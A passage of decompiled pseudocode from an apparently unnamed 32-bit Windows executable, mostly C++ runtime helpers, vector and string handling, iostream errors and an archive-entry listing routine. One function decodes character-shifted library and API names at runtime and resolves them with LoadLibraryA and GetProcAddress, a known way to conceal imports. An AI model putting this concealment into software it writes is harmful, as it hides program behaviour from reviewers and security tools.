      if ( (unsigned int)(v29[0] - v22 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_40FBF3(v22);
  }
  v23 = v36[0];
  if ( v36[0] )
  {
    if ( v37 - (unsigned int)v36[0] >= 0x1000 )
    {
      v23 = (void *)*((_DWORD *)v36[0] - 1);
      if ( (unsigned int)(v36[0] - v23 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_40FBF3(v23);
  }
  return v2;
}
// 40D1C0: using guessed type char var_13E6[2];

//----- (0040D590) --------------------------------------------------------
FARPROC __cdecl sub_40D590(char *String2)
{
  char **v1; // esi
  const char *v2; // eax
  char **v3; // edi
  char *v5; // ebx
  const char *v6; // esi
  char *v7; // ebx
  char *v8; // eax
  char *v9; // edx
  char v10; // al
  char *i; // ecx
  char v12; // al
  char *j; // ecx
  int v14; // esi
  HMODULE LibraryA; // eax
  int v16; // esi
  FARPROC ProcAddress; // ebx
  CHAR *lpLibFileName; // [esp+Ch] [ebp-10h]
  CHAR *lpProcName; // [esp+10h] [ebp-Ch]
  HMODULE v20; // [esp+14h] [ebp-8h]
  char **v21; // [esp+18h] [ebp-4h]

  v1 = off_500E48;
  if ( !off_500E48[0] )
    return 0;
  while ( 1 )
  {
    v2 = v1[1];
    v3 = v1 + 1;
    v21 = v1 + 1;
    if ( v2 )
      break;
LABEL_5:
    v1 += 513;
    if ( !*v1 )
      return 0;
  }
  while ( _stricmp(v2, String2) )
  {
    v2 = v3[2];
    v3 += 2;
    v21 = v3;
    if ( !v2 )
      goto LABEL_5;
  }
  v5 = v3[1];
  if ( v5 )
    return (FARPROC)v5;
  v6 = *v1;
  v7 = _strdup(*v3);
  lpProcName = v7;
  v8 = _strdup(v6);
  v9 = v8;
  lpLibFileName = v8;
  if ( !v7 )
  {
    if ( v8 )
      j___free_base(v8);
    v5 = 0;
    v3[1] = 0;
    return (FARPROC)v5;
  }
  if ( v8 )
  {
    v10 = *v7;
    for ( i = v7; *i; v10 = *i )
      *i++ = v10 - 1;
    v12 = *v9;
    for ( j = v9; *j; v12 = *j )
      *j++ = v12 - 1;
    v14 = 0;
    do
    {
      LibraryA = LoadLibraryA(lpLibFileName);
      v20 = LibraryA;
      if ( !LibraryA )
      {
        Sleep(0x64u);
        LibraryA = 0;
      }
      ++v14;
    }
    while ( !LibraryA && v14 < 4 );
    v16 = 0;
    do
    {
      ProcAddress = GetProcAddress(LibraryA, lpProcName);
      if ( !ProcAddress )
        Sleep(0x64u);
      ++v16;
      if ( ProcAddress )
        break;
      LibraryA = v20;
    }
    while ( v16 < 4 );
    j___free_base(lpProcName);
    j___free_base(lpLibFileName);
    v21[1] = (char *)ProcAddress;
    return ProcAddress;
  }
  else
  {
    j___free_base(v7);
    v3[1] = 0;
    return 0;
  }
}
// 500E48: using guessed type char *off_500E48[2];

//----- (0040D710) --------------------------------------------------------
int __cdecl sub_40D710(int a1, int a2, int a3)
{
  int v3; // ecx
  int result; // eax

  v3 = a1;
  for ( result = a3; v3 != a2; v3 += 24 )
  {
    *(_DWORD *)(result + 16) = 0;
    *(_DWORD *)(result + 20) = 0;
    *(_OWORD *)result = *(_OWORD *)v3;
    *(_QWORD *)(result + 16) = *(_QWORD *)(v3 + 16);
    result += 24;
    *(_DWORD *)(v3 + 16) = 0;
    *(_DWORD *)(v3 + 20) = 15;
    *(_BYTE *)v3 = 0;
  }
  return result;
}

//----- (0040D760) --------------------------------------------------------
void __cdecl sub_40D760(int a1, int a2)
{
  unsigned int v2; // ecx
  _DWORD *v3; // eax

  v2 = *(_DWORD *)(a2 + 20);
  if ( v2 >= 0x10 )
  {
    v3 = *(_DWORD **)a2;
    if ( v2 + 1 >= 0x1000 )
    {
      if ( (unsigned int)v3 - *(v3 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v3 = (_DWORD *)*(v3 - 1);
    }
    sub_40FBF3(v3);
  }
  *(_DWORD *)(a2 + 16) = 0;
  *(_DWORD *)(a2 + 20) = 15;
  *(_BYTE *)a2 = 0;
}

//----- (0040D7B0) --------------------------------------------------------
char *__thiscall sub_40D7B0(int *this, int a2)
{
  int v3; // edi
  int v4; // ecx
  char *result; // eax
  int v6; // eax
  int v7; // edi
  unsigned int v8; // ecx
  unsigned int v9; // edi
  unsigned int v10; // edx
  unsigned int v11; // eax
  unsigned int v12; // ecx
  size_t v13; // eax
  void *v14; // eax
  _DWORD *v15; // edi
  int v16; // ecx
  int v17; // eax
  void *v18; // eax
  int v19; // eax
  _DWORD v20[5]; // [esp+0h] [ebp-3Ch] BYREF
  unsigned int v21; // [esp+14h] [ebp-28h]
  int v22; // [esp+18h] [ebp-24h]
  int v23; // [esp+1Ch] [ebp-20h]
  int v24; // [esp+20h] [ebp-1Ch]
  int v25; // [esp+24h] [ebp-18h]
  void *Block; // [esp+28h] [ebp-14h]
  _DWORD *v27; // [esp+2Ch] [ebp-10h]
  int v28; // [esp+38h] [ebp-4h]

  v27 = v20;
  v3 = this[2];
  v4 = this[1];
  result = (char *)a2;
  v20[4] = this;
  v23 = a2;
  if ( v3 != v4 )
  {
    *(_DWORD *)(v4 + 16) = 0;
    *(_DWORD *)(v4 + 20) = 0;
    *(_OWORD *)v4 = *(_OWORD *)a2;
    *(_QWORD *)(v4 + 16) = *(_QWORD *)(a2 + 16);
    *(_DWORD *)(a2 + 16) = 0;
    *(_DWORD *)(a2 + 20) = 15;
    *(_BYTE *)a2 = 0;
    this[1] += 24;
    return result;
  }
  v6 = (v4 - *this) / 24;
  v25 = v6;
  if ( v6 == 178956970 )
    sub_40D0A0();
  v7 = v3 - *this;
  v8 = v6 + 1;
  v22 = v6 + 1;
  v9 = v7 / 24;
  v10 = v9 >> 1;
  if ( v9 <= 178956970 - (v9 >> 1) )
  {
    v11 = v10 + v9;
    if ( v10 + v9 < v8 )
      v11 = v8;
    v24 = v11;
  }
  else
  {
    v11 = v6 + 1;
    v24 = v8;
  }
  v12 = 24 * v11;
  v21 = 24 * v11;
  if ( v11 > 0xAAAAAAA )
  {
    v12 = -1;
LABEL_12:
    v13 = v12 + 35;
    if ( v12 + 35 <= v12 )
      v13 = -1;
    v14 = operator new(v13);
    if ( !v14 )
      goto LABEL_27;
    v15 = (_DWORD *)(((unsigned int)v14 + 35) & 0xFFFFFFE0);
    *(v15 - 1) = v14;
    goto LABEL_19;
  }
  if ( v12 >= 0x1000 )
    goto LABEL_12;
  if ( v12 )
  {
    Block = operator new(24 * v11);
    v15 = Block;
    goto LABEL_20;
  }
  v15 = 0;
LABEL_19:
  Block = v15;
LABEL_20:
  v16 = v23;
  v28 = 0;
  v17 = 3 * v25;
  v15[2 * v17 + 4] = 0;
  v15[2 * v17 + 5] = 0;
  *(_OWORD *)&v15[2 * v17] = *(_OWORD *)v16;
  *(_QWORD *)&v15[2 * v17 + 4] = *(_QWORD *)(v16 + 16);
  *(_DWORD *)(v16 + 16) = 0;
  *(_DWORD *)(v16 + 20) = 15;
  *(_BYTE *)v16 = 0;
  sub_40D710(*this, this[1], (int)v15);
  if ( *this )
  {
    sub_40DD10(*this, this[1]);
    v18 = (void *)*this;
    if ( (unsigned int)(24 * ((this[2] - *this) / 24)) < 0x1000 )
    {
LABEL_24:
      sub_40FBF3(v18);
      goto LABEL_25;
    }
    if ( (unsigned int)v18 - *((_DWORD *)v18 - 1) - 4 <= 0x1F )
    {
      v18 = (void *)*((_DWORD *)v18 - 1);
      goto LABEL_24;
    }
LABEL_27:
    _invalid_parameter_noinfo_noreturn();
  }
LABEL_25:
  v19 = v22;
  *this = (int)v15;
  this[1] = (int)&v15[6 * v19];
  result = (char *)&v15[v21 / 4];
  this[2] = (int)&v15[v21 / 4];
  return result;
}
// 40D0A0: using guessed type void __noreturn sub_40D0A0(void);
// 40D700: using guessed type _DWORD __cdecl unknown_libname_2(_DWORD);

//----- (0040DA00) --------------------------------------------------------
_BYTE *__thiscall sub_40DA00(_BYTE *this, int *a2)
{
  int v3; // edx
  int v4; // ecx
  int v5; // ecx
  int v6; // eax
  int *v7; // ecx

  *(_DWORD *)this = a2;
  v3 = *a2;
  v4 = *(int *)((char *)a2 + *(_DWORD *)(*a2 + 4) + 56);
  if ( v4 )
  {
    (*(void (__thiscall **)(int))(*(_DWORD *)v4 + 4))(v4);
    v3 = *a2;
  }
  v5 = *(_DWORD *)(v3 + 4);
  v6 = v3;
  if ( !*(int *)((char *)a2 + v5 + 12) )
  {
    v7 = *(int **)((char *)a2 + v5 + 60);
    if ( v7 )
    {
      if ( v7 != a2 )
      {
        sub_40DF30();
        v6 = *a2;
      }
    }
  }
  this[4] = *(int *)((char *)a2 + *(_DWORD *)(v6 + 4) + 12) == 0;
  return this;
}

//----- (0040DA90) --------------------------------------------------------
_BYTE *__thiscall sub_40DA90(_BYTE *this)
{
  _BYTE *result; // eax

  *(_DWORD *)this = 0;
  result = this;
  this[4] = 0;
  *((_DWORD *)this + 2) = 0;
  *((_DWORD *)this + 3) = 0;
  *((_DWORD *)this + 4) = 0;
  *((_DWORD *)this + 5) = 0;
  *((_DWORD *)this + 6) = 0;
  *((_DWORD *)this + 7) = 0;
  return result;
}

//----- (0040DAE0) --------------------------------------------------------
int __thiscall sub_40DAE0(int *this)
{
  int v1; // ecx
  int result; // eax
  int v3; // ecx

  v1 = *this;
  result = *(_DWORD *)(*(_DWORD *)v1 + 4);
  v3 = *(_DWORD *)(result + v1 + 56);
  if ( v3 )
    return (*(int (__thiscall **)(int))(*(_DWORD *)v3 + 8))(v3);
  return result;
}

//----- (0040DB30) --------------------------------------------------------
int __thiscall sub_40DB30(_BYTE **this)
{
  int result; // eax
  int v3; // ecx

  if ( !j____uncaught_exceptions() )
    sub_40DD80(*this);
  result = *(_DWORD *)(*(_DWORD *)*this + 4);
  v3 = *(_DWORD *)&(*this)[result + 56];
  if ( v3 )
    return (*(int (__thiscall **)(int))(*(_DWORD *)v3 + 8))(v3);
  return result;
}
// 40F36D: using guessed type int j____uncaught_exceptions(void);

//----- (0040DB90) --------------------------------------------------------
void __thiscall sub_40DB90(int this)
{
  int v2; // eax
  _DWORD *v3; // edi
  int v4; // ecx
  _DWORD *v5; // edi

  sub_40DE90((_DWORD **)this);
  v2 = *(_DWORD *)(this + 20);
  if ( v2 )
  {
    sub_40DD10(v2, *(_DWORD *)(this + 24));
    v3 = *(_DWORD **)(this + 20);
    if ( (unsigned int)(24 * ((*(_DWORD *)(this + 28) - (int)v3) / 24)) >= 0x1000 )
    {
      if ( (unsigned int)v3 - *(v3 - 1) - 4 > 0x1F )
        goto LABEL_12;
      v3 = (_DWORD *)*(v3 - 1);
    }
    sub_40FBF3(v3);
    *(_DWORD *)(this + 20) = 0;
    *(_DWORD *)(this + 24) = 0;
    *(_DWORD *)(this + 28) = 0;
  }
  v4 = *(_DWORD *)(this + 8);
  if ( !v4 )
    return;
  sub_40DD10(v4, *(_DWORD *)(this + 12));
  v5 = *(_DWORD **)(this + 8);
  if ( (unsigned int)(24 * ((*(_DWORD *)(this + 16) - (int)v5) / 24)) >= 0x1000 )
  {
    if ( (unsigned int)v5 - *(v5 - 1) - 4 <= 0x1F )
    {
      v5 = (_DWORD *)*(v5 - 1);
      goto LABEL_10;
    }
LABEL_12:
    _invalid_parameter_noinfo_noreturn();
  }
LABEL_10:
  sub_40FBF3(v5);
  *(_DWORD *)(this + 8) = 0;
  *(_DWORD *)(this + 12) = 0;
  *(_DWORD *)(this + 16) = 0;
}

//----- (0040DC80) --------------------------------------------------------
int __userpurge sub_40DC80@<eax>(int a1@<ecx>, __m64 a2@<mm0>, __m64 a3@<mm1>, int *a4)
{
  unsigned int v5; // esi
  int v6; // eax
  void *Block; // [esp+8h] [ebp-60h]
  int v9[22]; // [esp+Ch] [ebp-5Ch] BYREF

  if ( *(_BYTE *)(a1 + 4) )
  {
    v5 = 0;
    if ( !sub_401C90(*(_DWORD *)a1, v9, 0, 0, 0, 0, 0, 0) )
      v5 = v9[8];
    Block = (void *)unknown_libname_7(v5);
    v6 = sub_402140(a2, a3, *(_DWORD *)a1, (int)Block, v5);
    if ( v6 )
    {
      sub_40E310(a4, (int)Block, (unsigned int)v6);
      sub_40DF30(a4);
    }
    j_j_j___free_base(Block);
  }
  return a1;
}
// 41012F: using guessed type int __cdecl unknown_libname_7(_DWORD);

//----- (0040DD10) --------------------------------------------------------
void __stdcall sub_40DD10(int a1, int a2)
{
  int i; // esi
  unsigned int v3; // ecx
  _DWORD *v4; // eax

  for ( i = a1; i != a2; i += 24 )
  {
    v3 = *(_DWORD *)(i + 20);
    if ( v3 >= 0x10 )
    {
      v4 = *(_DWORD **)i;
      if ( v3 + 1 >= 0x1000 )
      {
        if ( (unsigned int)v4 - *(v4 - 1) - 4 > 0x1F )
          _invalid_parameter_noinfo_noreturn();
        v4 = (_DWORD *)*(v4 - 1);
      }
      sub_40FBF3(v4);
    }
    *(_DWORD *)(i + 16) = 0;
    *(_DWORD *)(i + 20) = 15;
    *(_BYTE *)i = 0;
  }
}

//----- (0040DD80) --------------------------------------------------------
int __thiscall sub_40DD80(_BYTE *this)
{
  int v2; // eax
  int result; // eax
  int v4; // ecx
  int v5; // ecx
  int *v6; // eax
  int *v7; // eax
  int *v8; // eax
  int v9; // [esp+0h] [ebp-6Ch] BYREF
  char v10[20]; // [esp+10h] [ebp-5Ch] BYREF
  char v11[20]; // [esp+24h] [ebp-48h] BYREF
  char pExceptionObject[20]; // [esp+38h] [ebp-34h] BYREF
  int v13; // [esp+4Ch] [ebp-20h] BYREF
  _DWORD v14[6]; // [esp+54h] [ebp-18h] BYREF

  v14[2] = &v9;
  v2 = *(_DWORD *)this;
  v14[5] = 0;
  result = *(_DWORD *)(v2 + 4);
  if ( !*(_DWORD *)&this[result + 12] && (this[result + 20] & 2) != 0 )
  {
    result = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)&this[result + 56] + 52))(*(_DWORD *)&this[result + 56]);
    if ( result == -1 )
    {
      v4 = *(_DWORD *)(*(_DWORD *)this + 4);
      result = *(_DWORD *)&this[v4 + 12] & 0x13 | 4;
      *(_DWORD *)&this[v4 + 12] = result;
      v5 = result & *(_DWORD *)&this[v4 + 16];
      if ( v5 )
      {
        if ( (v5 & 4) == 0 )
        {
          if ( (v5 & 2) != 0 )
          {
            v7 = sub_40B080(v14, 1);
            sub_407160(v11, "ios_base::failbit set", v7);
            _CxxThrowException(v11, (_ThrowInfo *)&_TI5_AVfailure_ios_base_std__);
          }
          v8 = sub_40B080(&v13, 1);
          sub_407160(v10, "ios_base::eofbit set", v8);
          _CxxThrowException(v10, (_ThrowInfo *)&_TI5_AVfailure_ios_base_std__);
        }
        v6 = sub_40B080(v14, 1);
        sub_407160(pExceptionObject, "ios_base::badbit set", v6);
        _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI5_AVfailure_ios_base_std__);
      }
    }
  }
  return result;
}

//----- (0040DE90) --------------------------------------------------------
int __thiscall sub_40DE90(_DWORD **this)
{
  int result; // eax

  if ( *this )
  {
    sub_40DD10((int)this[2], (int)this[3]);
    this[3] = this[2];
    sub_40DD10((int)this[5], (int)this[6]);
    this[6] = this[5];
    if ( *((_BYTE *)this + 4) )
    {
      sub_4023D0((int)*this);
      *((_BYTE *)this + 4) = 0;
    }
    result = sub_402900(*this);
    *this = 0;
  }
  return result;
}

//----- (0040DEF0) --------------------------------------------------------
void __stdcall sub_40DEF0(_DWORD *Block, int a2)
{
  void *v2; // ecx

  v2 = Block;
  if ( (unsigned int)(24 * a2) >= 0x1000 )
  {
    if ( (unsigned int)Block - *(Block - 1) - 4 > 0x1F )
      _invalid_parameter_noinfo_noreturn();
    v2 = (void *)*(Block - 1);
  }
  sub_40FBF3(v2);
}

//----- (0040DF30) --------------------------------------------------------
int *__thiscall sub_40DF30(int *this)
{
  int v2; // ecx
  int v3; // ecx
  int v4; // eax
  int v5; // ecx
  int v6; // ecx
  int *v8; // [esp-4h] [ebp-3Ch]
  int *v9; // [esp-4h] [ebp-3Ch]
  int *v10; // [esp-4h] [ebp-3Ch]
  char pExceptionObject[20]; // [esp+8h] [ebp-30h] BYREF
  _DWORD v12[2]; // [esp+1Ch] [ebp-1Ch] BYREF
  _BYTE *v13; // [esp+24h] [ebp-14h] BYREF
  char v14; // [esp+28h] [ebp-10h]
  int v15; // [esp+34h] [ebp-4h]

  if ( *(int *)((char *)this + *(_DWORD *)(*this + 4) + 56) )
  {
    sub_40DA00(&v13, this);
    v15 = 0;
    if ( v14 )
    {
      v2 = *(int *)((char *)this + *(_DWORD *)(*this + 4) + 56);
      if ( (*(int (__thiscall **)(int))(*(_DWORD *)v2 + 52))(v2) == -1 )
      {
        v3 = *(_DWORD *)(*this + 4);
        v4 = *(int *)((char *)this + v3 + 12) & 0x13 | 4;
        *(int *)((char *)this + v3 + 12) = v4;
        v5 = v4 & *(int *)((char *)this + v3 + 16);
        if ( v5 )
        {
          if ( (v5 & 4) != 0 )
          {
            v10 = sub_40B080(v12, 1);
            sub_407160(pExceptionObject, "ios_base::badbit set", v10);
          }
          else if ( (v5 & 2) != 0 )
          {
            v8 = sub_40B080(v12, 1);
            sub_407160(pExceptionObject, "ios_base::failbit set", v8);
          }
          else
          {
            v9 = sub_40B080(v12, 1);
            sub_407160(pExceptionObject, "ios_base::eofbit set", v9);
          }
          _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI5_AVfailure_ios_base_std__);
        }
      }
    }
    v15 = 1;
    if ( !j____uncaught_exceptions() )
      sub_40DD80(v13);
    LOBYTE(v15) = 2;
    v6 = *(_DWORD *)&v13[*(_DWORD *)(*(_DWORD *)v13 + 4) + 56];
    if ( v6 )
      (*(void (__thiscall **)(int))(*(_DWORD *)v6 + 8))(v6);
  }
  return this;
}
// 40F36D: using guessed type int j____uncaught_exceptions(void);
// 40DF30: using guessed type _DWORD var_1C[2];

//----- (0040E050) --------------------------------------------------------
char *__thiscall sub_40E050(char *this)
{
  return this + 8;
}

//----- (0040E060) --------------------------------------------------------
bool __thiscall sub_40E060(int *this, int a2)
{
  _DWORD *v3; // eax
  bool v4; // zf

  sub_40DE90((_DWORD **)this);
  v3 = sub_4028E0(a2);
  *this = (int)v3;
  v4 = v3 == 0;
  if ( v3 )
  {
    sub_40E0E0(this);
    v4 = *this == 0;
  }
  return !v4;
}

//----- (0040E090) --------------------------------------------------------
char __thiscall sub_40E090(int this, const char *a2)
{
  int v3; // eax

  v3 = *(_DWORD *)this;
  if ( *(_DWORD *)this )
  {
    if ( *(_BYTE *)(this + 4) )
    {
      sub_4023D0(*(_DWORD *)this);
      v3 = *(_DWORD *)this;
      *(_BYTE *)(this + 4) = 0;
    }
    if ( !sub_401DE0(v3, a2, 0) )
      *(_BYTE *)(this + 4) = sub_402B70(*(_DWORD *)this) == 0;
  }
  return *(_BYTE *)(this + 4);
}

//----- (0040E0E0) --------------------------------------------------------
_DWORD *__thiscall sub_40E0E0(int *this)
{
  _DWORD *result; // eax
  unsigned int i; // esi
  char v4; // al
  void *v5; // ecx
  void *v6[6]; // [esp+10h] [ebp-1ACh] BYREF
  void *Block[5]; // [esp+28h] [ebp-194h] BYREF
  unsigned int v8; // [esp+3Ch] [ebp-180h]
  int v9[22]; // [esp+40h] [ebp-17Ch] BYREF
  __int64 v10[2]; // [esp+98h] [ebp-124h] BYREF
  char Src[260]; // [esp+A8h] [ebp-114h] BYREF
  int v12; // [esp+1B8h] [ebp-4h]

  sub_40DD10(this[2], this[3]);
  this[3] = this[2];
  sub_40DD10(this[5], this[6]);
  this[6] = this[5];
  result = (_DWORD *)*this;
  if ( *this )
  {
    result = (_DWORD *)sub_401730(result, v10);
    for ( i = 0; (unsigned __int64)i < v10[0]; ++i )
    {
      if ( result )
        break;
      result = (_DWORD *)sub_401C90(*this, v9, (int)Src, 0x104u, 0, 0, 0, 0);
      if ( !result )
      {
        v4 = *((_BYTE *)&v10[1] + v9[10] + 7);
        if ( v4 == 47 || v4 == 92 )
        {
          Block[4] = 0;
          v8 = 15;
          LOBYTE(Block[0]) = 0;
          sub_4093F0(Block, Src, strlen(Src));
          v12 = 0;
          sub_40D7B0(this + 5, (int)Block);
          v12 = -1;
          if ( v8 >= 0x10 )
          {
            v5 = Block[0];
            if ( v8 + 1 >= 0x1000 )
            {
              v5 = (void *)*((_DWORD *)Block[0] - 1);
              if ( (unsigned int)(Block[0] - v5 - 4) > 0x1F )
                _invalid_parameter_noinfo_noreturn();
            }
            sub_40FBF3(v5);
          }
        }
        else
        {
          v6[4] = 0;
          v6[5] = (void *)15;
          LOBYTE(v6[0]) = 0;
          sub_4093F0(v6, Src, strlen(Src));
          v12 = 1;
          sub_40D7B0(this + 2, (int)v6);
          v12 = -1;
          sub_405C00(v6);
        }
        result = (_DWORD *)sub_401D30(*this);
      }
    }
  }
  return result;
}

//----- (0040E310) --------------------------------------------------------
int *__thiscall sub_40E310(int *this, int a2, __int64 a3)
{
  int v4; // edx
  int v5; // edi
  int v6; // ecx
  int v7; // ecx
  int v8; // eax
  int *v9; // ecx
  int v10; // ecx
  int v11; // eax
  _DWORD *v12; // edx
  int v13; // ecx
  int v14; // eax
  int v15; // ecx
  int v16; // eax
  int v17; // ebx
  int v18; // eax
  int v19; // edx
  int v20; // eax
  int v21; // ecx
  int *v23; // eax
  int *v24; // eax
  int *v25; // eax
  int v26; // [esp+0h] [ebp-6Ch] BYREF
  char v27[20]; // [esp+10h] [ebp-5Ch] BYREF
  char v28[20]; // [esp+24h] [ebp-48h] BYREF
  char pExceptionObject[20]; // [esp+38h] [ebp-34h] BYREF
  int *v30; // [esp+4Ch] [ebp-20h]
  bool v31; // [esp+50h] [ebp-1Ch]
  int v32; // [esp+54h] [ebp-18h]
  int *v33; // [esp+58h] [ebp-14h]
  int *v34; // [esp+5Ch] [ebp-10h]
  int v35; // [esp+68h] [ebp-4h]

  v34 = &v26;
  v33 = this;
  v4 = *this;
  v5 = 0;
  v32 = 0;
  v30 = this;
  v6 = *(int *)((char *)this + *(_DWORD *)(v4 + 4) + 56);
  if ( v6 )
  {
    (*(void (__thiscall **)(int))(*(_DWORD *)v6 + 4))(v6);
    v4 = *this;
  }
  v7 = *(_DWORD *)(v4 + 4);
  v8 = v4;
  v35 = 0;
  if ( !*(int *)((char *)this + v7 + 12) )
  {
    v9 = *(int **)((char *)this + v7 + 60);
    if ( v9 )
    {
      if ( v9 != this )
      {
        sub_40DF30(v9);
        v8 = *this;
      }
    }
  }
  v10 = *(_DWORD *)(v8 + 4);
  v11 = *(int *)((char *)this + v10 + 12);
  v31 = v11 == 0;
  v35 = 1;
  if ( v11 )
  {
    v5 = 4;
  }
  else if ( a3 >= 0 )
  {
    v17 = a3;
    if ( a3 > 0 )
    {
      v18 = **(_DWORD **)((char *)this + v10 + 56);
      LOBYTE(v35) = 2;
      if ( (*(int (__stdcall **)(int, _DWORD, _DWORD))(v18 + 36))(a2, a3, HIDWORD(a3)) != v17 || v19 != HIDWORD(a3) )
        v5 = 4;
      v35 = 1;
    }
  }
  v12 = (int *)((char *)this + *(_DWORD *)(*this + 4));
  if ( v5 )
  {
    v13 = v5 | v12[3] | 4;
    if ( v12[14] )
      v13 = v5 | v12[3];
    v14 = v12[4];
    v15 = v13 & 0x17;
    v12[3] = v15;
    v16 = v15 & v14;
    if ( v16 )
    {
      if ( (v16 & 4) == 0 )
      {
        if ( (v16 & 2) != 0 )
        {
          v24 = sub_40B080(&a3, 1);
          sub_407160(v28, "ios_base::failbit set", v24);
          _CxxThrowException(v28, (_ThrowInfo *)&_TI5_AVfailure_ios_base_std__);
        }
        v25 = sub_40B080(&a3, 1);
        sub_407160(v27, "ios_base::eofbit set", v25);
        _CxxThrowException(v27, (_ThrowInfo *)&_TI5_AVfailure_ios_base_std__);
      }
      v23 = sub_40B080(&a3, 1);
      sub_407160(pExceptionObject, "ios_base::badbit set", v23);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI5_AVfailure_ios_base_std__);
    }
  }
  v35 = 4;
  if ( !j____uncaught_exceptions() )
    sub_40DD80(this);
  v20 = *this;
  LOBYTE(v35) = 5;
  v21 = *(int *)((char *)this + *(_DWORD *)(v20 + 4) + 56);
  if ( v21 )
    (*(void (__thiscall **)(int))(*(_DWORD *)v21 + 8))(v21);
  return this;
}
// 40E407: variable 'v19' is possibly undefined
// 40F36D: using guessed type int j____uncaught_exceptions(void);

//----- (0040E5C7) --------------------------------------------------------
char *__thiscall sub_40E5C7(char *this, int a2)
{
  sub_4070E0(this, a2);
  *(_DWORD *)this = &std::bad_alloc::`vftable';
  return this;
}
// 432A74: using guessed type void *std::bad_alloc::`vftable';

//----- (0040E5E2) --------------------------------------------------------
_DWORD *__thiscall sub_40E5E2(_DWORD *this)
{
  _DWORD *result; // eax

  this[1] = 0;
  result = this;
  this[2] = 0;
  this[1] = "bad allocation";
  *this = &std::bad_alloc::`vftable';
  return result;
}
// 432A74: using guessed type void *std::bad_alloc::`vftable';

//----- (0040E631) --------------------------------------------------------
char *__thiscall sub_40E631(char *this, int a2)
{
  sub_4070E0(this, a2);
  *(_DWORD *)this = &std::invalid_argument::`vftable';
  return this;
}
// 432A9C: using guessed type void *std::invalid_argument::`vftable';

//----- (0040E64C) --------------------------------------------------------
std::exception *__thiscall sub_40E64C(std::exception *this, char *a2)
{
  std::exception::exception(this, a2);
  *(_DWORD *)this = &std::invalid_argument::`vftable';
  return this;
}
// 432A9C: using guessed type void *std::invalid_argument::`vftable';

//----- (0040E66D) --------------------------------------------------------
char *__thiscall sub_40E66D(char *this, int a2)
{
  sub_4070E0(this, a2);
  *(_DWORD *)this = &std::length_error::`vftable';
  return this;
}
// 432AA8: using guessed type void *std::length_error::`vftable';

//----- (0040E688) --------------------------------------------------------
std::exception *__thiscall sub_40E688(std::exception *this, char *a2)
{
  std::exception::exception(this, a2);
  *(_DWORD *)this = &std::length_error::`vftable';
  return this;
}
// 432AA8: using guessed type void *std::length_error::`vftable';

//----- (0040E6A9) --------------------------------------------------------
char *__thiscall sub_40E6A9(char *this, int a2)
{
  sub_4070E0(this, a2);
  *(_DWORD *)this = &std::logic_error::`vftable';
  return this;
}
// 432A90: using guessed type void *std::logic_error::`vftable';

//----- (0040E6C4) --------------------------------------------------------
char *__thiscall sub_40E6C4(char *this, int a2)
{
  sub_4070E0(this, a2);
  *(_DWORD *)this = &std::out_of_range::`vftable';
  return this;
}
// 432AB4: using guessed type void *std::out_of_range::`vftable';

//----- (0040E6DF) --------------------------------------------------------
std::exception *__thiscall sub_40E6DF(std::exception *this, char *a2)
{
  std::exception::exception(this, a2);
  *(_DWORD *)this = &std::out_of_range::`vftable';
  return this;
}
// 432AB4: using guessed type void *std::out_of_range::`vftable';

//----- (0040E72D) --------------------------------------------------------
void __cdecl __noreturn sub_40E72D(char *a1)
{
  char pExceptionObject[12]; // [esp+0h] [ebp-Ch] BYREF

  sub_40E64C((std::exception *)pExceptionObject, a1);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
}

//----- (0040E74D) --------------------------------------------------------
void __cdecl __noreturn sub_40E74D(char *a1)
{
  char pExceptionObject[12]; // [esp+0h] [ebp-Ch] BYREF

  sub_40E688((std::exception *)pExceptionObject, a1);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVlength_error_std__);
}

//----- (0040E76D) --------------------------------------------------------
void __cdecl __noreturn sub_40E76D(char *a1)
{
  char pExceptionObject[12]; // [esp+0h] [ebp-Ch] BYREF

  sub_40E6DF((std::exception *)pExceptionObject, a1);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVout_of_range_std__);
}

//----- (0040EBBD) --------------------------------------------------------
int sub_40EBBD()
{
  return dword_50968C;
}
// 50968C: using guessed type int dword_50968C;

//----- (0040F177) --------------------------------------------------------
FILE *__cdecl sub_40F177(char *FileName, int a2, int ShFlag)
{
  int v3; // eax
  int v4; // ecx
  unsigned int v5; // eax
  int v6; // esi
  FILE *v8; // eax
  FILE *v9; // eax
  FILE *v10; // esi

  v3 = a2;
  v4 = 1;
  if ( (a2 & 0x40) != 0 )
    v3 = a2 | 1;
  if ( (v3 & 8) != 0 )
    v3 |= 2u;
  v5 = v3 & 0xFFFFFF3B;
  v6 = 0;
  do
  {
    if ( v4 == v5 )
      break;
    v4 = dword_43362C[v6++];
  }
  while ( v4 );
  if ( !dword_433628[v6] )
    return 0;
  if ( (a2 & 0x80) != 0 && (v5 & 0xA) != 0 )
  {
    v8 = _fsopen(FileName, "r", ShFlag);
    if ( v8 )
    {
      fclose(v8);
      return 0;
    }
  }
  v9 = _fsopen(FileName, (&Mode)[v6], ShFlag);
  v10 = v9;
  if ( !v9 )
    return 0;
  if ( (a2 & 4) != 0 && fseek(v9, 0, 2) )
  {
    fclose(v10);
    return 0;
  }
  return v10;
}
// 433628: using guessed type int dword_433628[];
// 43362C: using guessed type int dword_43362C[14];

//----- (0040F223) --------------------------------------------------------
FILE *__cdecl sub_40F223(char *FileName, int a2, int ShFlag)
{
  return sub_40F177(FileName, a2, ShFlag);
}

//----- (0040F3A5) --------------------------------------------------------
void __cdecl sub_40F3A5(LPCRITICAL_SECTION lpCriticalSection)
{
  LeaveCriticalSection(lpCriticalSection);
}

//----- (0040FBF3) --------------------------------------------------------
void __cdecl sub_40FBF3(void *Block)
{
  j_j___free_base(Block);
}

//----- (0040FCA5) --------------------------------------------------------
int sub_40FCA5()
{
  __scrt_initialize_default_local_stdio_options();
  return 0;
}
// 41064E: using guessed type int __scrt_initialize_default_local_stdio_options(void);

//----- (0040FCAD) --------------------------------------------------------
int sub_40FCAD()
{
  int v0; // eax

  sub_410816();
  v0 = UserMathErrorFunction();
  return _set_new_mode(v0);
}

